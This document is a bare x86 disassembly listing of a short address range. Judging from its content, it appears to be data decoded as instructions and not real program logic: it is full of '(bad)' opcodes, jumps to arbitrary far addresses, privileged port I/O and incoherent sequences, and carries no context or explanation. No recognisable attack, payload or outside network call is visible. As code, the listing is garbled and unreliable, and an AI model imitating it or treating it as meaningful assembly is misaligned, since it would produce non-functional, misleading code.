  40d869:	stos   WORD PTR es:[edi],ax
  40d86b:	sub    ecx,DWORD PTR [eax+ebp*4-0x3a]
  40d86f:	repz popf 
  40d871:	es mov bh,0xc6
  40d874:	dec    edi
  40d875:	jae    0x40d80c
  40d877:	or     al,0x28
  40d879:	dec    ecx
  40d87a:	pop    ecx
  40d87b:	cmp    al,0xbb
  40d87d:	inc    eax
  40d87e:	jbe    0x40d8bc
  40d880:	or     al,0x80
  40d882:	sub    edx,0x921f0c66
  40d888:	cmp    BYTE PTR [edx],0xa6
  40d88b:	sbb    al,0x61
  40d88d:	cld    
  40d88e:	sbb    eax,0x8a2ebb46
  40d893:	pop    ebx
  40d894:	popf   
  40d895:	inc    ebx
  40d896:	push   ds
  40d897:	ror    DWORD PTR [esi-0x50f201e1],1
  40d89d:	loop   0x40d8e6
  40d89f:	rcl    DWORD PTR [ecx+0x4f5d9d57],0x70
  40d8a6:	mov    al,0x51
  40d8a8:	fs or  eax,0xfb9d4ebc
  40d8ae:	rcr    al,cl
  40d8b0:	pop    edi
  40d8b1:	aas    
  40d8b2:	jae    0x40d8d3
  40d8b4:	and    DWORD PTR [esi+0x19],edi
  40d8b7:	mov    bh,0xc2
  40d8b9:	sti    
  40d8ba:	addr16 cld 
  40d8bc:	xchg   ebp,eax
  40d8bd:	xor    BYTE PTR [ebp+eiz*1-0x26fd1903],ah
  40d8c4:	lock ficomp WORD PTR [edx+0x7d]
  40d8c8:	mov    WORD PTR [edi],es
  40d8ca:	jnp    0x40d914
  40d8cc:	mov    ch,0x6
  40d8ce:	xchg   esi,eax
  40d8cf:	cdq    
  40d8d0:	mov    esi,0x8c314987
  40d8d5:	popa   
  40d8d6:	(bad)  
  40d8d7:	or     eax,0x75aaaf1b
  40d8dc:	mov    dl,0x6f
  40d8de:	pop    ebx
  40d8df:	enter  0xf84e,0x7b
  40d8e3:	jne    0x40d936
  40d8e5:	dec    eax
  40d8e6:	sahf   
  40d8e7:	jle    0x40d946
  40d8e9:	imul   BYTE PTR [ecx]
  40d8eb:	aas    
  40d8ec:	iret   
  40d8ed:	adc    bl,BYTE PTR [ecx-0x70669779]
  40d8f3:	mov    eax,0x203d671f
  40d8f8:	popf   
  40d8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8fa:	ficomp DWORD PTR [edi-0x78]
  40d8fd:	mov    ebx,0xad5a3b33
  40d902:	push   esi
  40d903:	jmp    0xf105:0x396b070
  40d90a:	repnz pop ds
  40d90c:	or     edi,DWORD PTR [ecx]
  40d90e:	pop    esp
  40d90f:	pop    ebx
  40d910:	inc    ebx
  40d911:	xchg   BYTE PTR [edx-0x2c0d7d27],dl
  40d917:	adc    edi,esp
  40d919:	in     eax,0xc6
  40d91b:	lock pop ebp
  40d91d:	sar    DWORD PTR [eax],0x44
  40d920:	lds    ebx,FWORD PTR [eax]
  40d922:	lods   eax,DWORD PTR ds:[esi]
  40d923:	std    
  40d924:	cdq    
  40d925:	leave  
  40d926:	mov    ebx,0x9c05c68c
  40d92b:	xor    ecx,DWORD PTR [eax+0x3a]
  40d92e:	sub    BYTE PTR [eax+0x34ffba5b],ch
  40d934:	out    0xdd,al
  40d936:	mov    dh,0x30
  40d938:	sar    DWORD PTR [eax+eax*1+0x28],cl
  40d93c:	mov    ah,0x4d
  40d93e:	ret    
  40d93f:	pcmpgtd mm5,QWORD PTR [eax]
  40d942:	inc    ecx
  40d943:	push   esi
  40d944:	jle    0x40d999
  40d946:	sub    esi,DWORD PTR [edi+0x12157041]
  40d94c:	or     BYTE PTR [esi],al
  40d94e:	bound  edi,QWORD PTR [edx+0x26044b7f]
  40d954:	je     0x40d931
  40d956:	(bad)  
  40d957:	data16 out dx,al
  40d959:	mov    ah,BYTE PTR [edx-0x6739da74]
  40d95f:	adc    cl,BYTE PTR [ebp-0x3d706e33]
  40d965:	lock into 
  40d967:	aam    0x6
  40d969:	mov    eax,ds:0xff0ec133
  40d96e:	mov    edi,0x9dce8a11
  40d973:	mov    ecx,cs
  40d975:	out    dx,al
  40d976:	jg     0x40d967
  40d978:	fsubr  QWORD PTR [edx+0x5df049b0]
  40d97e:	jmp    0xf4f1ea5d
  40d983:	(bad)  
  40d984:	jns    0x40d999
  40d986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d987:	cmc    
  40d988:	mov    eax,ds:0x284af034
  40d98d:	inc    ebp
  40d98e:	sub    ebx,ecx
  40d990:	mov    dh,0x9
  40d992:	mov    eax,ds:0x2ad638d6
  40d997:	add    BYTE PTR [esi+0x7b17a50e],ah
  40d99d:	leave  
  40d99e:	inc    ecx
  40d99f:	pop    ecx
  40d9a0:	ret    0x3ec9
  40d9a3:	ret    0x34c5
  40d9a6:	add    DWORD PTR [esi-0xda77551],esi
  40d9ac:	scas   al,BYTE PTR es:[edi]
  40d9ad:	sub    eax,DWORD PTR [eax-0x725d8bb2]
  40d9b3:	bound  ebx,QWORD PTR [ebp-0x1a]
  40d9b6:	(bad)  
  40d9b7:	add    dh,BYTE PTR [edi+0x52]
  40d9ba:	dec    eax
  40d9bb:	aad    0xc8
  40d9bd:	and    esp,DWORD PTR [ecx-0x49119b9d]
  40d9c3:	push   ss
  40d9c4:	adc    esp,DWORD PTR [edx+0x35c3b106]
  40d9ca:	mov    eax,ds:0x5b63d715
  40d9cf:	pop    ecx
  40d9d0:	nop
  40d9d1:	aaa    
  40d9d2:	push   es
  40d9d3:	xchg   ebx,eax
  40d9d4:	cmp    esi,DWORD PTR [edi+0x1f]
  40d9d7:	(bad)  
  40d9d8:	test   al,0xe5
  40d9da:	sbb    ch,BYTE PTR [esi-0x48]
  40d9dd:	das    
  40d9de:	or     al,0x7d
  40d9e0:	ins    DWORD PTR es:[edi],dx
  40d9e1:	mov    edi,0xc299d8fd
  40d9e6:	and    BYTE PTR [eax-0x6ceb154d],0xe0
  40d9ed:	adc    ebp,ebp
  40d9ef:	inc    ebx
  40d9f0:	mov    eax,ds:0x1d54baa2
  40d9f5:	mov    bl,bh
  40d9f7:	out    0x8d,eax
  40d9f9:	xchg   ebx,eax
  40d9fa:	mov    ebp,0x4f095547
  40d9ff:	or     eax,0xf102ae3e
  40da04:	scas   al,BYTE PTR es:[edi]
  40da05:	pop    esp
  40da06:	jbe    0x40d9eb
  40da08:	call   0x70e01555
  40da0d:	mov    eax,ds:0xdb9695f8
  40da12:	aam    0xce
  40da14:	xchg   edi,eax
  40da15:	jne    0x40da8d
  40da17:	pop    eax
  40da18:	in     al,0x10
  40da1a:	xchg   ebp,eax
  40da1b:	fucomip st,st(2)
  40da1d:	mov    ecx,0x5e18c23f
  40da22:	popf   
  40da23:	mov    ds:0x9f5a8c74,al
  40da28:	mov    edi,0x46709526
  40da2d:	add    DWORD PTR [eax-0x481526b3],0x7d
  40da34:	mov    ?,WORD PTR [edx+0x6]
  40da37:	mov    ecx,0x5b35cd52
  40da3c:	pop    esp
  40da3d:	or     DWORD PTR [eax+ebx*8+0x51180f1a],esi
  40da44:	pusha  
  40da45:	mov    ah,0x6d
  40da47:	sbb    bh,BYTE PTR [eax]
  40da49:	mov    al,ds:0xea2d7463
  40da4e:	or     dh,BYTE PTR [edx+0x602ce8e2]
  40da54:	cmp    DWORD PTR [ebp+eax*2+0x58ecca5b],ebp
  40da5b:	fimul  DWORD PTR ds:0xbae61456
  40da61:	sahf   
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	icebp  
  40da64:	xchg   ebx,eax
  40da65:	jo     0x40dade
  40da67:	gs add al,dl
  40da6a:	(bad)  
  40da6b:	hlt    
  40da6c:	iret   
  40da6d:	cmp    eax,0xe217d5e1
  40da72:	add    al,0x57
  40da74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da75:	fisttp QWORD PTR [eax]
  40da77:	test   esi,esi
  40da79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da7a:	cmp    eax,0xed95d628
  40da7f:	into   
  40da80:	jnp    0x40dabd
  40da82:	dec    edi
  40da83:	xchg   BYTE PTR [edi],dh
  40da85:	mov    bl,bl
  40da87:	pop    es
  40da88:	pop    ebp
  40da89:	push   cs
  40da8a:	clc    
  40da8b:	add    esp,DWORD PTR [esi+0x71]
  40da8e:	xchg   BYTE PTR [ecx+edx*4+0xb966f99],bh
  40da95:	jo     0x40da47
  40da97:	dec    edx
  40da98:	xor    dl,0x61
  40da9b:	xor    BYTE PTR [esi+ebp*1+0x6e134d79],0xb0
  40daa3:	add    esp,DWORD PTR [ebp+eiz*2-0x80]
  40daa7:	cli    
  40daa8:	js     0x40dae6
  40daaa:	jge    0x40da82
  40daac:	and    eax,0x3d6b91b2
  40dab1:	ins    DWORD PTR es:[edi],dx
  40dab2:	lock test al,0x6a
  40dab5:	imul   esp,DWORD PTR [edi+esi*1-0xf],0xef03b719
  40dabd:	aad    0xf0
  40dabf:	or     edx,ebx
  40dac1:	js     0x40daa5
  40dac3:	pushf  
  40dac4:	cmp    eax,0x355b1a0b
  40dac9:	push   esi
  40daca:	std    
  40dacb:	push   ecx
  40dacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacd:	aad    0xdc
  40dacf:	call   0x8092:0xf15341ff
  40dad6:	retf   
  40dad7:	retf   0x3743
  40dada:	mov    edi,0xad405195
  40dadf:	ret    0x85fa
  40dae2:	std    
  40dae3:	(bad)  
  40dae4:	jge    0x40da78
  40dae6:	(bad)  
  40dae7:	push   ebx
  40dae8:	mov    ah,bl
  40daea:	inc    edi
  40daeb:	cmp    esi,DWORD PTR [esi+0x1165a614]
  40daf1:	(bad)  
  40daf2:	mov    eax,0x7635f8d9
  40daf7:	sub    al,0xcd
  40daf9:	fstp   QWORD PTR [edx-0x553eb548]
  40daff:	pop    edi
  40db00:	lahf   
  40db01:	call   0xd1ea:0x35d9c244
  40db08:	mov    edi,0xec4b6bca
  40db0d:	push   esp
  40db0e:	fwait
  40db0f:	jg     0x40daef
  40db11:	pop    ebp
  40db12:	inc    eax
  40db13:	inc    eax
  40db14:	pop    eax
  40db15:	and    DWORD PTR [edx+0x3d851833],ebp
  40db1b:	jae    0x40db06
  40db1d:	lods   al,BYTE PTR ds:[esi]
  40db1e:	xor    eax,0x451e776
  40db23:	inc    esi
  40db24:	xchg   edi,eax
  40db25:	push   ebp
  40db26:	(bad)  
  40db27:	xor    esp,DWORD PTR [eax-0x49]
  40db2a:	add    cl,BYTE PTR [eax-0x48]
  40db2d:	fs adc eax,0x8f65bf78
  40db33:	sbb    ah,0x19
  40db36:	push   ebx
  40db37:	xchg   ebp,eax
  40db38:	push   ecx
  40db39:	mov    esi,0xb8ac67fc
  40db3e:	mov    bh,0x86
  40db40:	adc    ah,BYTE PTR [eax-0x31]
  40db43:	dec    esp
  40db44:	cmp    al,0x84
  40db46:	add    esi,ecx
  40db48:	test   BYTE PTR [esi-0x7bfbb830],al
  40db4e:	add    dh,BYTE PTR [ebx]
  40db50:	sar    BYTE PTR [ebx+0x2d],1
  40db53:	idiv   BYTE PTR [esi+0x7e]
  40db56:	push   ds
  40db57:	adc    eax,0x38a5b0a9
  40db5c:	loopne 0x40db67
  40db5e:	adc    eax,0xf70aaeb9
  40db63:	retf   
  40db64:	xchg   DWORD PTR [eax-0x6e],ebp
  40db67:	mov    edi,0x943a55dc
  40db6c:	jne    0x40db18
  40db6e:	dec    ecx
  40db6f:	pop    es
  40db70:	addr16 cmp ecx,ecx
  40db73:	add    al,0x26
  40db75:	pop    ds
  40db76:	or     eax,0xae188048
  40db7b:	mov    edx,0x39aeb530
  40db80:	aas    
  40db81:	stos   DWORD PTR es:[di],eax
  40db83:	inc    edx
  40db84:	or     eax,0x5e61edab
  40db89:	fisub  WORD PTR [esi]
  40db8b:	out    0x5d,eax
  40db8d:	and    BYTE PTR [edi+0x2],bl
  40db90:	inc    ecx
  40db91:	pusha  
  40db92:	sub    cl,ch
  40db94:	mov    esp,DWORD PTR [edi]
  40db96:	push   edx
  40db97:	in     eax,dx
  40db98:	and    al,0xf3
  40db9a:	xchg   esp,eax
  40db9b:	sub    dl,BYTE PTR fs:[ecx+ebx*4-0x49]
  40dba0:	into   
  40dba1:	nop
  40dba2:	push   esp
  40dba3:	out    dx,al
  40dba4:	cmc    
  40dba5:	rcl    BYTE PTR [esi-0xc147959],1
  40dbab:	mov    dl,0xf9
  40dbad:	xlat   BYTE PTR ds:[ebx]
  40dbae:	hlt    
  40dbaf:	or     BYTE PTR [edx+0xd7e1dff],dh
  40dbb5:	pop    eax
  40dbb6:	(bad)  
  40dbb7:	retf   0xb5
  40dbba:	mov    cl,cl
  40dbbc:	jmp    0x40db88
  40dbbe:	daa    
  40dbbf:	add    al,0xb1
  40dbc1:	sub    al,BYTE PTR [edi+0x8e61715]
  40dbc7:	bound  esi,QWORD PTR [edx-0x72cb1742]
  40dbcd:	out    0x21,eax
  40dbcf:	add    eax,0xa29bef4a
  40dbd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd5:	cmc    
  40dbd6:	gs in  eax,0x43
  40dbd9:	shl    edi,1
  40dbdb:	call   0x7a75:0x76840a24
  40dbe2:	adc    BYTE PTR [esi+0x40fe0ec4],al
  40dbe8:	retf   0xe0f3
  40dbeb:	mov    DWORD PTR [eax],esp
  40dbed:	(bad)  
  40dbee:	xor    DWORD PTR [edx],esp
  40dbf0:	jmp    0x40dc52
  40dbf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbf4:	int3   
  40dbf5:	mov    al,0xa8
  40dbf7:	inc    edx
  40dbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf9:	push   eax
  40dbfa:	inc    ebp
  40dbfb:	mov    dh,0x73
  40dbfd:	repnz push ebx
  40dbff:	mov    eax,ds:0xafab256b
  40dc04:	popf   
  40dc05:	or     ch,ah
  40dc07:	iret   
  40dc08:	fimul  WORD PTR [edi]
  40dc0a:	push   es
  40dc0b:	(bad)  
  40dc0c:	sar    bh,0x31
  40dc0f:	inc    esp
  40dc10:	ret    
  40dc11:	mov    ebx,0xa17c7c2b
  40dc16:	in     eax,dx
  40dc17:	mov    ds:0xd3376e2c,eax
  40dc1c:	push   ss
  40dc1d:	(bad)  
  40dc1e:	inc    esp
  40dc1f:	push   ebp
  40dc20:	dec    edx
  40dc21:	fadd   QWORD PTR [eax]
  40dc23:	fistp  QWORD PTR [edx+0x6109bb2c]
  40dc29:	push   cs
  40dc2a:	mov    edx,0x10027fc5
  40dc2f:	cmp    BYTE PTR [eax],0xe9
  40dc32:	mov    ah,dh
  40dc34:	ficom  DWORD PTR [eax+0x29]
  40dc37:	adc    al,0xc0
  40dc39:	mov    eax,0xdaa93b20
  40dc3e:	mov    edx,0xe3835d45
  40dc43:	aas    
  40dc44:	hlt    
  40dc45:	mov    eax,DWORD PTR [edi*4+0x6fdb9247]
  40dc4c:	repnz dec eax
  40dc4e:	adc    esi,DWORD PTR [edx+0x41]
  40dc51:	pop    ecx
  40dc52:	sub    eax,0xd73696e5
  40dc57:	mov    al,ds:0x9a41cc64
  40dc5c:	shl    edi,1
  40dc5e:	test   BYTE PTR [ecx+0x44cef2e6],al
  40dc64:	pop    esp
  40dc65:	(bad)  
  40dc66:	(bad)  
  40dc67:	imul   ebp,DWORD PTR [eax-0x41],0xffffff9c
  40dc6b:	xor    al,0x69
  40dc6d:	xchg   BYTE PTR [eax+0xd],cl
  40dc70:	push   eax
  40dc71:	jp     0x40dcb2
  40dc73:	mov    ds:0x2147e6c9,eax
  40dc78:	fimul  DWORD PTR [eax-0x17]
  40dc7b:	test   al,0xa9
  40dc7d:	mov    bl,0x75
  40dc7f:	or     eax,0x8497ed3e
  40dc84:	and    ah,BYTE PTR [ebp+0x121b50dc]
  40dc8a:	mov    eax,0xe97fb941
  40dc8f:	test   ecx,esp
  40dc91:	call   0xe5f1:0x55bd8bff
  40dc98:	and    ah,BYTE PTR [ecx-0x27]
  40dc9b:	in     al,0x19
  40dc9d:	xchg   ebp,eax
  40dc9e:	fdiv   DWORD PTR [ecx]
  40dca0:	add    DWORD PTR [ebp-0x1a12767f],edi
  40dca6:	sub    bl,BYTE PTR [edi-0x44e34221]
  40dcac:	int3   
  40dcad:	fcmovne st,st(2)
  40dcaf:	sub    ebx,DWORD PTR [ecx-0x11]
  40dcb2:	dec    ebp
  40dcb3:	mov    bl,BYTE PTR [eax+esi*8]
  40dcb6:	pop    ecx
  40dcb7:	rol    cl,0x30
  40dcba:	fwait
  40dcbb:	mov    ds:0x9cf061e9,eax
  40dcc0:	(bad)  [eax]
  40dcc2:	and    al,0x44
  40dcc4:	cs xchg edi,eax
  40dcc6:	push   ss
  40dcc7:	popf   
  40dcc8:	test   DWORD PTR [eax+0x44],ecx
  40dccb:	xchg   edi,eax
  40dccc:	aas    
  40dccd:	leave  
  40dcce:	jnp    0x40dd2f
  40dcd0:	pop    esi
  40dcd1:	in     eax,0x20
  40dcd3:	lods   eax,DWORD PTR ds:[esi]
  40dcd4:	jnp    0x40dd28
  40dcd6:	dec    edi
  40dcd7:	jnp    0x40dc6b
  40dcd9:	mov    ecx,0x60dee183
  40dcde:	cs cmc 
  40dce0:	inc    ecx
  40dce1:	lods   eax,DWORD PTR ds:[esi]
  40dce2:	test   eax,0xb3fcabf0
  40dce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dce8:	mov    ebx,0x491e7aa2
  40dced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcee:	test   BYTE PTR [edx+0x4b6ef458],0x24
  40dcf5:	cmp    esp,DWORD PTR [edx+0x4fcfc01a]
  40dcfb:	leave  
  40dcfc:	(bad)  
  40dcfe:	pop    es
  40dcff:	les    ebp,FWORD PTR [eax]
  40dd01:	xor    al,0x7e
  40dd03:	shr    DWORD PTR [eax+0x5eb7fe0c],1
  40dd09:	push   ebp
  40dd0a:	enter  0xe904,0xd9
  40dd0e:	jbe    0x40dd67
  40dd10:	sbb    bh,dh
  40dd12:	cwde   
  40dd13:	inc    ebp
  40dd14:	aam    0xc8
  40dd16:	push   edi
  40dd17:	cmp    eax,0x1a1c4f7b
  40dd1c:	mov    ds:0x2dd16a87,eax
  40dd21:	retf   0x789b
  40dd24:	(bad)  
  40dd25:	and    edi,esi
  40dd27:	cli    
  40dd28:	pop    ebx
  40dd29:	xor    eax,0xd8fa538e
  40dd2e:	ret    
  40dd2f:	add    eax,0xf33afa57
  40dd34:	inc    esi
  40dd35:	mov    ds:0xc3d56c0d,al
  40dd3a:	call   0xf5e3c65c
  40dd3f:	mov    eax,ds:0x774278db
  40dd44:	jae    0x40dcfe
  40dd46:	push   0x30
  40dd48:	pop    edi
  40dd49:	repz mov eax,0xa3774397
  40dd4f:	mov    al,0xf4
  40dd51:	adc    DWORD PTR [edx+0x3d],ebp
  40dd54:	lea    esp,[esi]
  40dd56:	fst    DWORD PTR [edx+edi*8+0x77a10d9e]
  40dd5d:	std    
  40dd5e:	mov    BYTE PTR [eax-0x15],bl
  40dd61:	dec    edi
  40dd63:	cmp    al,0xae
  40dd65:	test   DWORD PTR [esi-0x8],0x36af34e8
  40dd6c:	mov    fs,WORD PTR [edx]
  40dd6e:	cmc    
  40dd6f:	cmp    ecx,ebp
  40dd71:	ds pop esi
  40dd73:	lods   al,BYTE PTR ds:[esi]
  40dd74:	out    dx,eax
  40dd75:	pop    ds
  40dd76:	or     eax,0x98ceafcb
  40dd7b:	jle    0x40dddf
  40dd7d:	and    DWORD PTR [eax+0x66604ff4],edi
  40dd83:	inc    esi
  40dd84:	add    BYTE PTR [edi],ah
  40dd86:	pop    edx
  40dd87:	sub    DWORD PTR [ecx-0x76],ecx
  40dd8a:	shr    BYTE PTR [edx],0xa7
  40dd8d:	adc    DWORD PTR [edx],ebx
  40dd8f:	into   
  40dd90:	xor    dl,BYTE PTR [ebx-0x15]
  40dd93:	xchg   ebp,eax
  40dd94:	xchg   esi,eax
  40dd95:	arpl   WORD PTR [ecx],dx
  40dd97:	mov    ah,0x89
  40dd99:	xlat   BYTE PTR ds:[ebx]
  40dd9a:	das    
  40dd9b:	add    bl,BYTE PTR [esi+0x7c]
  40dd9e:	jmp    0x7a161b0d
  40dda3:	xor    al,0x8e
  40dda5:	push   ecx
  40dda6:	mov    BYTE PTR [edx],ch
  40dda8:	shl    BYTE PTR [ebp-0x3e30c4ec],1
  40ddae:	jl     0x40dda0
  40ddb0:	or     eax,0xcf346f5b
  40ddb5:	inc    ecx
  40ddb6:	imul   ebp,ebp,0x1077cf45
  40ddbc:	or     al,0xf2
  40ddbe:	xchg   cl,ah
  40ddc0:	les    edi,FWORD PTR [ebx+0x1dc05892]
  40ddc6:	test   dl,0x52
  40ddc9:	lahf   
  40ddca:	fs (bad) 
  40ddce:	loop   0x40dd95
  40ddd0:	btr    DWORD PTR [ebx],0x2c
  40ddd4:	mov    al,0x10
  40ddd6:	and    BYTE PTR [ecx],bh
  40ddd8:	je     0x40ddd2
  40ddda:	cli    
  40dddb:	mov    ebx,0xa8c3bb37
  40dde0:	xor    eax,0xfa2dc878
  40dde5:	or     BYTE PTR [ecx+0x1f],0xd1
  40dde9:	push   esi
  40ddea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddec:	or     ah,BYTE PTR [esi-0x38]
  40ddef:	mov    bl,bh
  40ddf1:	or     BYTE PTR [edx+ebx*2+0x64e79140],cl
  40ddf8:	dec    esi
  40ddf9:	scas   al,BYTE PTR es:[edi]
  40ddfa:	and    dh,BYTE PTR [esi]
  40ddfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddfd:	test   al,0xc2
  40ddff:	fsub   DWORD PTR [ebx-0x17]
  40de02:	lods   eax,DWORD PTR ds:[esi]
  40de03:	push   es
  40de04:	mov    eax,ds:0xede91164
  40de09:	jmp    0xc843:0x6fcd986e
  40de10:	or     ch,0x4f
  40de13:	std    
  40de14:	sbb    dl,BYTE PTR [ebx+ebx*2+0x11]
  40de18:	(bad)  
  40de19:	push   bp
  40de1b:	fsub   st,st(6)
  40de1d:	cmc    
  40de1e:	out    dx,eax
  40de1f:	retf   0x8214
  40de22:	jae    0x40dde8
  40de24:	push   0x1a
  40de26:	cs or  edx,ecx
  40de29:	mov    ecx,ebx
  40de2b:	sub    ebp,esp
  40de2d:	push   cs
  40de2e:	sbb    esi,ebx
  40de30:	pushf  
  40de31:	mov    esp,0x37776687
  40de36:	xchg   edx,eax
  40de37:	mov    WORD PTR [edi+eiz*2+0x3db5fa01],gs
  40de3e:	add    al,dl
  40de40:	mov    eax,0xd32b8d82
  40de45:	and    dl,BYTE PTR [ebx+ebx*8]
  40de48:	clc    
  40de49:	mov    cl,0xec
  40de4b:	mov    eax,0x18882283
  40de50:	cmc    
  40de51:	and    DWORD PTR [eax+0x6b],0xd7b6bafb
  40de58:	sub    al,0xc8
  40de5a:	jecxz  0x40debb
  40de5c:	leave  
  40de5d:	add    al,0x71
  40de60:	push   ecx
  40de61:	jecxz  0x40ded3
  40de63:	pop    edx
  40de64:	sbb    al,0xa9
  40de66:	sub    DWORD PTR [eax+0x89d5b73],0x77
  40de6d:	push   ebx
  40de6e:	xchg   esp,eax
  40de6f:	push   esp
  40de70:	jne    0x40de9f
  40de72:	imul   edx,ebp,0x9e603721
  40de78:	fwait
  40de79:	jge    0x40de99
  40de7b:	sub    edi,esp
  40de7d:	nop
  40de7e:	fiadd  DWORD PTR cs:[ebp+0x55]
  40de82:	pop    edx
  40de83:	jle    0x40de22
  40de85:	in     eax,0xcf
  40de87:	outs   dx,BYTE PTR ds:[esi]
  40de88:	xchg   esp,eax
  40de89:	jne    0x40de75
  40de8b:	or     eax,0xc262f631
  40de90:	push   edi
  40de91:	in     eax,dx
  40de92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de93:	outs   dx,DWORD PTR ds:[esi]
  40de94:	cwde   
  40de95:	outs   dx,DWORD PTR ds:[esi]
  40de96:	mov    BYTE PTR [esi+0x63081b13],bh
  40de9c:	jbe    0x40de4c
  40de9e:	call   0xc40a:0xe017ce3f
  40dea5:	(bad)  
  40dea6:	das    
  40dea7:	push   eax
  40dea8:	not    BYTE PTR [ebp-0x5449cdc0]
  40deae:	jne    0x40dee4
  40deb0:	popf   
  40deb1:	(bad)  
  40deb2:	mov    WORD PTR [edx],?
  40deb4:	test   al,0xec
  40deb6:	pop    ebx
  40deb7:	call   0x469e:0x22687983
  40debe:	and    dl,BYTE PTR [eax]
  40dec0:	imul   ebp,esi,0xf407f71c
  40dec6:	jp     0x40de54
  40dec8:	leave  
  40dec9:	lahf   
  40deca:	mov    ds:0xa2f965a2,eax
  40decf:	gs mov dl,0x3c
  40ded2:	fidivr WORD PTR [ecx-0x1bfb7f98]
  40ded8:	jmp    0xbac8:0x29bab2a5
  40dedf:	add    eax,0xc91bd78b
  40dee4:	les    esi,FWORD PTR [ecx+0x7c]
  40dee7:	in     eax,0xaf
  40dee9:	jo     0x40deb2
  40deeb:	or     eax,0xa7c90e0b
  40def0:	xor    DWORD PTR [edi+0x22ebac6],ebp
  40def6:	ja     0x40deeb
  40def8:	xchg   ecx,eax
  40def9:	add    DWORD PTR [edx-0x6cf52d89],ebp
  40deff:	mov    eax,ds:0xaae69398
  40df04:	jp     0x40deb2
  40df06:	lds    esp,FWORD PTR es:[eax]
  40df09:	push   esi
  40df0a:	int    0xde
  40df0c:	add    DWORD PTR [esi+0x82f7ad],edi
  40df12:	cmp    DWORD PTR [edi-0x264618e1],ebx
  40df18:	arpl   WORD PTR [edx-0x52],bx
  40df1b:	addr16 dec ecx
  40df1d:	mov    bh,0x76
  40df1f:	shl    cl,cl
  40df21:	inc    edi
  40df22:	add    BYTE PTR [ebx],cl
  40df24:	xchg   edx,eax
  40df25:	arpl   sp,cx
  40df27:	fstp   DWORD PTR [ebx]
  40df29:	cdq    
  40df2a:	arpl   WORD PTR [eax-0x5ed85420],bx
  40df30:	cdq    
  40df31:	and    eax,edi
  40df33:	cmp    al,BYTE PTR [esi+0x5e5b3608]
  40df39:	aaa    
  40df3a:	ret    0x140b
  40df3d:	sbb    edx,edi
  40df3f:	int    0x80
  40df41:	lock loopne 0x40df05
  40df44:	sbb    DWORD PTR ds:0xf9de3b9e,ebp
  40df4a:	mov    dh,0x58
  40df4c:	ins    DWORD PTR es:[edi],dx
  40df4d:	push   es
  40df4e:	pushf  
  40df4f:	pop    eax
  40df50:	in     eax,dx
  40df51:	mov    BYTE PTR [eax+0x2d9479f9],dl
  40df57:	or     DWORD PTR [esi+0x27],0xefcb4759
  40df5e:	mov    ecx,0x5416d128
  40df63:	fistp  WORD PTR [ecx+0x5d]
  40df66:	inc    edi
  40df67:	inc    edi
  40df68:	in     eax,0x34
  40df6a:	push   ecx
  40df6b:	aam    0x86
  40df6d:	jne    0x40df01
  40df6f:	shl    bh,cl
  40df71:	or     bl,BYTE PTR [edx-0x26]
  40df74:	sub    eax,0xa4a30a81
  40df79:	sti    
  40df7a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df7c:	jg     0x40dfb0
  40df7e:	mov    al,ds:0x4495ad37
  40df83:	xchg   edx,eax
  40df84:	dec    ebx
  40df85:	loope  0x40dfdc
  40df87:	push   esi
  40df88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df89:	dec    edx
  40df8a:	cmp    al,0xd1
  40df8c:	adc    DWORD PTR [ecx+0x34],0xf8e1d24e
  40df93:	jl     0x40df69
  40df95:	mov    ch,0x88
  40df97:	mov    BYTE PTR [edx],0x53
  40df9a:	imul   ecx,DWORD PTR [edi+ebx*8-0x3232782b],0x31af16fd
  40dfa5:	pop    edx
  40dfa6:	sahf   
  40dfa7:	mov    esi,0x629c1784
  40dfac:	ficomp DWORD PTR [ecx]
  40dfae:	cmp    al,0x2d
  40dfb0:	mov    BYTE PTR ds:0x5e417366,0x46
  40dfb7:	pop    edi
  40dfb8:	leave  
  40dfb9:	loope  0x40df3b
  40dfbb:	loop   0x40dffa
  40dfbd:	jle    0x40dfa6
  40dfbf:	sub    cl,cl
  40dfc1:	in     eax,dx
  40dfc2:	sbb    DWORD PTR [ebp+0x56ed22f0],0x94dbe087
  40dfcc:	and    DWORD PTR ds:0xc1908f4e,edi
  40dfd2:	fld    TBYTE PTR [edx]
  40dfd4:	adc    eax,ecx
  40dfd6:	sub    eax,0xe91f06e4
  40dfdb:	inc    eax
  40dfdc:	xchg   BYTE PTR [ebx+0x7b],cl
  40dfdf:	mov    eax,0xa22b4e1f
  40dfe4:	and    ecx,DWORD PTR ds:[ecx+0x6d47c0fa]
  40dfeb:	jge    0x40df88
  40dfed:	pusha  
  40dfee:	jge    0x40dfe5
  40dff0:	add    ebx,DWORD PTR [ebx-0x75]
  40dff3:	ret    
  40dff4:	jg     0x40dfa0
  40dff6:	icebp  
  40dff7:	jmp    0xb1fd4d97
  40dffc:	jne    0x40e02b
  40dffe:	adc    ch,BYTE PTR [eax-0x141eadf2]
  40e004:	mov    esp,0xf5bee37d
  40e009:	jmp    0x2822:0x281e2ccd
  40e010:	push   eax
  40e011:	jbe    0x40e084
  40e013:	fisttp QWORD PTR [ebp+edx*2+0x48]
  40e017:	push   0x4a
  40e019:	mov    edi,0x7e0cb4da
  40e01e:	fcom   QWORD PTR [ebx-0x362f0f00]
  40e024:	(bad)  
  40e025:	jmp    FWORD PTR [ebx+ebp*1+0x379ef3b8]
  40e02c:	push   ds
  40e02d:	int3   
  40e02e:	mov    ebx,0xf8f8e0d2
  40e033:	ret    
  40e034:	pop    eax
  40e035:	and    bh,cl
  40e037:	aam    0xf1
